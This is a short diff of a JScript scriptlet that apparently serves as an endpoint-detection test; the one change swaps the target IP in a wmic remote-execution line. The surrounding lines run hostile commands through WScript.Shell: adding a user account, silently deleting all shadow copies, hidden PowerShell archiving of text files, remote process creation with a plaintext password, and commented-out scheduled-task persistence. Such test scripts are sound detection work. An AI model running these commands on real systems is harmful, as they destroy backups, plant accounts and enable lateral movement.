@@ -13,7 +13,7 @@ var r = new ActiveXObject("WScript.Shell").Run("ping misdepatrment.com -i 1");
 var r = new ActiveXObject("WScript.Shell").Run("net user /add sh123");
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c vssadmin.exe Delete Shadows /All /Quiet");
 var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -NoP -sta -NonI -W Hidden Compress-Archive -Path c:\\temp\\*.txt -Destination c:\\temp\\test.zip");
-var r = new ActiveXObject("WScript.Shell").Run("wmic /node:192.168.0.13 /user:11100 /password:Crowdstrike2017! process call create notepad");
+var r = new ActiveXObject("WScript.Shell").Run("wmic /node:172.17.0.26 /user:11100 /password:Crowdstrike2017! process call create notepad");
 //var r = new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo > c:\\edrtest\\systeminfo.txt");
 //var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest.bat /sc minute");
 ]]>
